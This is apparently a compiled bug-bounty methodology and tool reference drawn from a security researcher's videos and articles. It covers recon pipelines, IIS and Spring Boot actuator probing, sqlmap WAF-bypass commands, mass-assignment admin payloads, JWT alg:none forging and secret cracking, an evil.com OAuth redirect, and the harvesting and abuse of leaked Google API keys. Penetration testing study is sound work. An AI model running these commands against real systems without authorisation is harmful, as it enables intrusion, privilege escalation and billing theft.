# Community — Complete Methodology & Tool Reference

> YouTube:  | Medium: @Community | GitHub: Community
> 46 videos, 10K followers, 15 open-source tools (10K+ total stars)
> Focus: Bug bounty recon automation, fuzzing, IIS, Spring Boot, SQLi

---

## 1. 5-MINUTE BUG HUNTING WORKFLOW

His fastest approach to find bugs on any target quickly:

```
Shodan → Nuclei (mass CVE scan) → Wayback URLs → GF Patterns → Custom scripts
```

### Step-by-step:
1. **Shodan search** for mass CVE exposure (`shodan search org:"Target"`)
2. **Wayback URLs**: `gau target.com | uro | httpx-toolkit`
3. **GF patterns**: `gf xss | gf sqli | gf ssrf | gf redirect`
4. **Nuclei**: `nuclei -dast -l live_urls.txt`
5. **Custom tools**: PassiveFuzzer, loxs for multi-vuln scanning
6. **AlienVault + URLScan + VirusTotal** for passive URL collection

---

## 2. FUZZING & SCANNING PIPELINE

His core recon pipeline:

```
CHAOS → HTTPX → NAABU → NMAP + Parsers → NUCLEI → FFUF
```

| Step | Tool | Purpose |
|------|------|---------|
| 1 | Chaos | Subdomain enumeration |
| 2 | HTTPX | Live host filtering |
| 3 | Naabu | Port scanning (fast) |
| 4 | NaabuToNmap.py | Parse Naabu output → run Nmap with vuln scripts |
| 5 | Nuclei | Vulnerability scanning |
| 6 | FFUF | Directory/parameter fuzzing |

### Key technique: Naabu → Nmap pipeline
```bash
# Step 1: Fast port scan
naabu -l live_hosts.txt -top-ports 1000 -o naabu_results.txt

# Step 2: Parse and run Nmap with vuln scripts
python3 naabutonmap.py -i naabu_results.txt -o nmap-out

# nmap runs: -sS -sV -sC --version-all --script vuln,default --open -T4 -Pn
```

---

## 3. MICROSOFT IIS HACKING METHODOLOGY

### Phase 1: Google Dorking for IIS targets
```
intitle:"IIS Windows Server" site:*.target.com
intext:"IIS Windows Server" site:*.target.com
inurl:"IIS Windows Server" site:*.target.com
```

### Phase 2: IIS Shortname Scanning
IIS 8.0+ disclosure vulnerability — 8.3 short filename leak:
```
https://target.com/*~1*/a.aspx  → reveals short names
```

### Phase 3: ASP.NET viewstate exploitation
- Extract viewstate from pages
- Decode MAC with `MachineKey` if exposed
- Forge malicious viewstate for RCE

### Phase 4: Advanced Fuzzing
- Fuzz for `.asp`, `.aspx`, `.config`, `.xml` files
- Test `/App_Browsers/`, `/App_Data/`, `/App_Code/`
- Check `web.config` exposure
- Test HTTP methods (PUT, DELETE, OPTIONS)

---

## 4. SPRING BOOT ACTUATOR EXPLOITATION

### Discovery
```bash
# Shodan
shodan search "title:Actuator" org:"Target"

# Common actuator paths to fuzz
/actuator
/actuator/health
/actuator/env
/actuator/beans
/actuator/mappings
/actuator/configprops
/actuator/threaddump
/actuator/heapdump
/actuator/logfile
/actuator/loggers
/actuator/httptrace
/actuator/metrics
/actuator/info
/actuator/conditions
/actuator/scheduledtasks
/actuator/caches
/actuator/refresh
/actuator/restart
/actuator/shutdown
```

### Key endpoints to check:
| Endpoint | What it leaks | Risk |
|----------|---------------|------|
| `/actuator/env` | Environment variables, API keys, passwords | Critical |
| `/actuator/heapdump` | Full memory dump → extract secrets | Critical |
| `/actuator/configprops` | Configuration properties | High |
| `/actuator/beans` | All Spring beans | Medium |
| `/actuator/mappings` | URL mappings | Medium |
| `/actuator/logfile` | Log files (may contain secrets) | High |
| `/actuator/threaddump` | Thread info, stack traces | Low |
| `/actuator/refresh` | POST to reload config | High |
| `/actuator/restart` | POST to restart app | High |
| `/actuator/shutdown` | POST to shut down app | Critical |

---

## 5. SQL INJECTION (SQLmap + Ghauri WAF Bypass)

### WAF Bypass Techniques
```bash
# Random User-Agent + delay
sqlmap -u "https://target.com/page?id=1" --random-agent --delay=2

# Tor + suffix
sqlmap -u "https://target.com/page?id=1" --tor --tor-type=SOCKS5

# Tamper scripts
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Ghauri for lighter scanning
ghauri -u "https://target.com/page?id=1" --tamper between

# Custom null byte bypass
sqlmap -u "https://target.com/page?id=1" --suffix="NULL" --prefix="')"
```

---

## 6. REACT2SHELL (CVE-2025-55182) — RCE in Next.js

### What it is
Insecure deserialization in React Server Components (RSC) "Flight" protocol.
CVSS 10.0 — affects Next.js apps using App Router.

### Detection
```bash
# Check for RSC endpoint
curl -s https://target.com/ | grep -i "rsc\|flight\|__rsc"

# Send malicious Flight payload
# (Modified JSON in __rsc= parameter)
```

### Exploitation
- The server deserializes untrusted data in the Flight protocol
- Send crafted JSON payload → server-side code execution
- Works because `JSON.parse` on server-side doesn't sanitize

---

## 7. CERTIFICATE TRANSPARENCY LOG MONITORING

### Tool: crtmon (his tool, 180⭐)
```bash
# Install
git clone https://github.com/crtmon
cd crtmon && pip install -r requirements.txt

# Monitor a target
python3 crtmon.py -d target.com

# Get alerts when new subdomains appear
# Runs 24/7 - catches fresh assets minutes after cert issuance
```

### Why it matters
- Discover subdomains before they appear in static datasets
- Avoid duplicates by finding assets first
- Automate recon so you never miss new scope

---

## 8. HIS CUSTOM TOOLS (locally available)

We already have several installed locally:

| Tool | Location | What it does |
|------|----------|-------------|
| **passive_fuzzer.sh** | `/home/.../scripts/passive_fuzzer.sh` | gau → uro → httpx → nuclei pipeline |
| **alienvault.sh** | `/home/.../scripts/alienvault.sh` | Fetch URLs from AlienVault OTX |
| **naabutonmap.py** | `/home/.../scripts/naabutonmap.py` | Naabu results → Nmap vuln scanning |
| **dorking.py** | `/home/.../scripts/dorking.py` | Google dorking automation |

### Missing (install on demand):
- **crtmon** — CT log monitor (180⭐)
- **loxs** — Multi-vuln scanner (1586⭐) — SQLi, CRLF, XSS, LFI, OpenRedirect
- **GFpattren** — GF patterns (189⭐)
- **wayback-url-finder** — Wayback URL discovery (253⭐)

---

## 9. RECON TO MASTER — COMPLETE CHECKLIST (Jul 2025)

18-min read: step-by-step recon from subdomains to vulnerability discovery.

### Full workflow:
```bash
# 1. Subdomain enumeration
subfinder -d target.com -all -o subs.txt
chaos -d target.com -o chaos_subs.txt
crtmon -d target.com          # real-time CT monitoring

# 2. Manual subdomain discovery
#   - GitHub: search "target.com" in code
#   - Shodan: shodan search org:"Target"
#   - ASN mapping: amass intel -org "Target"

# 3. Subdomain brute-force (FFUF)
ffuf -w subdomains.txt -u https://FUZZ.target.com

# 4. IP discovery via ASN
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq

# 5. Live host detection
httpx-toolkit -l resolved.txt -silent -o live.txt

# 6. Visual recon
aquatone -scan-timeout 500 -out aquatone/
# or: cat live.txt | aquatone

# 7. Crawling
katana -list live.txt -o katana_urls.txt
hakrawler -domain target.com -outdir crawl/

# 8. Historical URLs
gau -subs target.com | uro > gau_urls.txt
waybackurls target.com >> historical.txt

# 9. Extract JS endpoints
cat all_urls.txt | grep "\.js$" | httpx-toolkit -silent > js_files.txt

# 10. Parameter discovery
#    GF patterns on all URLs
#    Arjun for parameter brute-force
#    ParamSpider for automated param gathering

# 11. Vulnerability scanning on discovered endpoints
#    nuclei -l live.txt -t cves/
#    nuclei -l live.txt -t exposures/
#    nuclei -l live.txt -t misconfigurations/
```

### Key takeaway
Recon is 80% of the work. The time invested here directly correlates with finding rate. Never skip to exploitation without thorough recon.

---

## 10. USER REGISTRATION BUGS (Nov 2025)

7-min read: common vulnerabilities in signup systems.

### Attack surface during registration:
- **Email/username enumeration** — different error messages for existing vs new users
- **Rate limiting bypass** — no captcha on repeated requests
- **Weak password policy** — no complexity requirements
- **Email verification bypass** — modify `verified=true` in JSON body
- **Referral code abuse** — self-referral for unlimited rewards
- **Duplicate user creation** — race condition on unique constraints
- **Account takeover via email** — change email in request to hijack
- **IDOR on user IDs** — sequential IDs during signup
- **Mass assignment** — hidden fields like `role`, `admin`, `is_admin`
- **OTP/verification code brute-force** — no rate limit on code validation
- **Missing 2FA enforcement** — register without required second factor

### Testing methodology:
```bash
# 1. Intercept signup request in Burp
# 2. Add hidden fields to JSON payload:
#    {"email":"x@y.com","password":"Test123!","role":"admin","is_admin":true}
# 3. Check for error message differences (enumeration)
# 4. Replay registration requests (race condition)
# 5. Modify verification status in response
```

---

## 11. MASS ASSIGNMENT — REGISTRATION FLOW EXPLOITS (Nov 2025)

7-min read: hidden JSON fields in signup APIs that grant privilege escalation.

### Why it works
Most frameworks deserialize JSON into objects automatically. No allowlist → attacker injects `role`, `admin`, `verified`, `balance` into request.

### Payload variations to test:
```json
// Basic privilege escalation
{"email":"x@y.com","password":"Test123!","role":"admin"}

// Array-based
{"email":"x@y.com","password":"Test123!","roles":["admin","superuser"]}

// Nested object
{"email":"x@y.com","password":"Test123!","permissions":{"admin":true}}

// Numeric/flat
{"email":"x@y.com","password":"Test123!","admin":1,"verified":1}

// Verification bypass
{"email":"x@y.com","password":"Test123!","email_verified":true,"is_active":true}

// Wallet/balance
{"email":"x@y.com","password":"Test123!","balance":99999,"credit":99999}
```

### Where to test
- `POST /api/register`
- `POST /api/signup`
- `POST /api/v1/users`
- `POST /api/account/create`
- `PATCH /api/user/profile` (post-registration upgrade)

### Detection command:
```bash
# Test each variation, compare response for different status codes or
# check if admin functionality becomes accessible
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","role":"admin"}'
```

---

## 12. AUTH & SESSION MANAGEMENT BUGS (Dec 2025)

7-min read: session handling flaws, JWT attacks, CSRF, and OAuth misconfigs.

### Session testing checklist:
- [ ] Old session still valid after password change (no session invalidation)
- [ ] Session fixation — can attacker set victim's session ID
- [ ] No HttpOnly/Secure flags on cookies
- [ ] JWT not signed (alg:none attack)
- [ ] JWT uses weak secret (brute-force with hashcat)
- [ ] JWT claims tampering — modify `sub`, `role`, `admin` in payload
- [ ] CSRF token not tied to session (reusable tokens)
- [ ] CSRF token missing on state-changing requests
- [ ] OAuth CSRF — state parameter missing or predictable
- [ ] OAuth redirect URI validation bypass
- [ ] OAuth token leakage via Referer header
- [ ] OpenID Connect — `nonce` missing or static
- [ ] Session timeout too long or not enforced
- [ ] Concurrent session limits not enforced

### JWT attack commands:
```bash
# Check alg:none
python3 -c "import jwt; print(jwt.encode({'sub':'admin','role':'admin'},'',algorithm='none'))"

# Brute-force weak secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Check claims tampering (modify payload, keep original header)
# Use jwt.io or PyJWT
```

### OAuth testing:
```bash
# Test redirect_uri bypass
https://app.com/auth/callback?redirect_uri=https://evil.com

# Test state parameter
# Remove 'state' from OAuth request → CSRF possible

# Test token leakage
# Check Referer header after OAuth flow
```

---

## 13. GOOGLE API KEY EXPLOITATION (May 2026)

13-min read: exposed Google API keys → Gemini AI access, financial impact, automation.

### Why keys matter now
With Gemini API integration, an exposed Google API key can:
- Access Gemini AI models (text, vision, code)
- Generate unauthorized AI usage at the victim's cost
- Access other enabled services (Maps, YouTube, Geocoding, etc.)
- Bypass IP/domain restrictions if improperly configured

### Discovery methods:
```bash
# 1. GitHub dorking
#    "AIza[0-9A-Za-z_-]{35}" language:python
#    "key=" "AIza" org:target
#    "api_key" "AIza"

# 2. JS files
gau target.com | grep "\.js$" | while read url; do
  curl -s "$url" | grep -oP 'AIza[0-9A-Za-z_-]{35}'
done

# 3. Wayback Machine
waybackurls target.com | grep -oP 'AIza[0-9A-Za-z_-]{35}' | sort -u

# 4. Environment files (.env, .env.prod, etc.)
ffuf -w env_files.txt -u https://target.com/FUZZ -mr "AIza"

# 5. Shodan + dorking.py
python3 dorking.py -d target.com
```

### Validation:
```bash
# Check which services the key can access
curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=KEY"
curl -s "https://www.googleapis.com/usage?key=KEY"
curl -s "https://generativelanguage.googleapis.com/v1/models?key=KEY"

# Check Gemini access directly
curl -s -X POST "https://generativelanguage.googleapis.com/v1/models/gemini-pro:generateContent?key=KEY" \
  -H "Content-Type: application/json" \
  -d '{"contents":[{"parts":[{"text":"Hello"}]}]}'
```

### Impact escalation:
- **Gemini API abuse** — generate content at scale, cost to victim
- **Maps API quota theft** — drain daily quota
- **YouTube Data API** — scrape/search without limits
- **Service enablement** — try different API endpoints to find enabled services
- **Billing impact** — high usage triggers overage charges

### Automation:
```bash
# Dorking.py already in ~/scripts/
# Add key scanning to recon pipeline:
gau target.com | grep "\.js$" | xargs -I{} sh -c 'curl -s "{}" | grep -oP "AIza[0-9A-Za-z_-]{35}"'
```

---

## 14. PASSIVE RECON TECHNIQUES

### Multi-source URL collection:
```bash
# 1. Gau (GetAllUrls)
gau target.com

# 2. Wayback Machine
waybackurls target.com

# 3. AlienVault OTX (we have this script)
./alienvault.sh target.com

# 4. URLScan.io
curl -s "https://urlscan.io/api/v1/search/?q=domain:target.com"

# 5. VirusTotal
curl -s "https://www.virustotal.com/api/v3/domains/target.com/subdomains"

# 6. Certificate Transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json"
```

### URL filtering pipeline:
```bash
# Combine all sources, deduplicate, filter for params
cat all_urls.txt | uro | grep -E '\?[^=]+=.+$' | httpx-toolkit -silent
```

---

## 15. VULNERABILITY TYPES HE COVERS

Based on Medium articles + YouTube content:

| Vuln Type | His Approach |
|-----------|-------------|
| **XSS** | GF patterns → nuclei → manual testing with custom payloads |
| **SQLi** | CustomBsqli + loxs + SQLmap/Ghauri WAF bypass |
| **SSRF** | GF for params → test with collaborator |
| **RCE** | React2Shell (Next.js), IIS viewstate, Spring Boot actuators |
| **IDOR** | Manual param tampering after auth |
| **Open Redirect** | loxs tool detection |
| **CRLF Injection** | loxs tool detection |
| **LFI** | loxs + manual path traversal |
| **Info Disclosure** | Actuator endpoints, IIS shortname, S3 buckets |
| **Authentication flaws** | Session management, OAuth misconfig, JWT attacks |
| **Subdomain Takeover** | Check unclaimed CNAMEs on cloud services |

---

## 16. COMPLETE RECON PIPELINE (PUTTING IT ALL TOGETHER)

```bash
# ===== PHASE 1: ENUMERATION =====
# Subdomains
subfinder -d target.com -all -o subs.txt
chaos -d target.com -o chaos_subs.txt
crtmon -d target.com (real-time)

# Combine + resolve
cat subs.txt chaos_subs.txt | sort -u | dnsx -silent -o resolved.txt

# Live hosts
httpx-toolkit -l resolved.txt -silent -o live.txt

# Port scan
naabu -l live.txt -top-ports 1000 -o ports.txt

# Nmap deep scan
python3 naabutonmap.py -i ports.txt -o nmap_scan

# ===== PHASE 2: URL COLLECTION =====
gau -subs target.com | uro > urls.txt
waybackurls target.com >> urls.txt
./alienvault.sh target.com >> urls.txt
cat urls.txt | sort -u | uro > all_urls.txt

# ===== PHASE 3: VULNERABILITY SCANNING =====
# Quick wins
gf xss all_urls.txt | httpx-toolkit -silent | nuclei -tags xss
gf sqli all_urls.txt | httpx-toolkit -silent | nuclei -tags sqli
gf ssrf all_urls.txt | httpx-toolkit -silent | nuclei -tags ssrf

# Full DAST scan
nuclei -dast -l all_urls.txt -o nuclei_results.txt

# Custom fuzzing
ffuf -w wordlist.txt -u https://target.com/FUZZ

# ===== PHASE 4: TARGETED CHECKS =====
# IIS targets
ffuf -w /usr/share/wordlists/iis_shortname.txt -u https://target.com/FUZZ

# Spring Boot actuators
ffuf -w actuator_paths.txt -u https://target.com/FUZZ

# React2Shell (Next.js)
curl -s https://target.com/ | grep "rsc\|flight\|__rsc"
```

---

## 17. SOURCE MATERIALS

| Type | Link |
|------|------|
| YouTube | https://youtube.com/ |
| Medium | https://Community.medium.com |
| GitHub | https://github.com/Community |
| Discord | https://discord.gg/xTVU4jkScV |
| Twitter/X | (reference removed) |
